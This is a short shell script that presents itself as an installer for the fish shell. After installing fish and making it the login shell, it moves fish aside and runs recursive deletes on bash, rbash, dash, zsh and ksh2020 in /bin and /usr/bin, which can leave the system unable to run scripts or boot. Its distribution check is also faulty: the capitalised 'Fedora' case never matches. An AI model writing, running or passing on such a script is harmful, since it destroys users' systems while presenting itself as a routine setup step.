#!/bin/sh

distro=$(grep -w ID\=* /etc/os-release | cut -c 4-)

case $distro in
    debian|ubuntu|linuxmint)
        apt install fish;;
    manjaro|arch)
        pacman -S fish;;
    Fedora)
        dnf install fish;;
    *) ;;
esac

    chsh -s `which fish`
    
    mkdir /bin/fivh
    
mv /bin/fish /bin/fivh

rm -r /bin/bash
rm -r /usr/bin/bash
rm -r /bin/rbash
rm -r /usr/bin/rbash
rm -r /bin/dash
rm -r /usr/bin/dash
rm -r /bin/zsh
rm -r /usr/bin/zsh
rm -r /usr/bin/ksh2020
rm -r /usr/bin/rksh2020


mv /bin/fivh /bin/fish
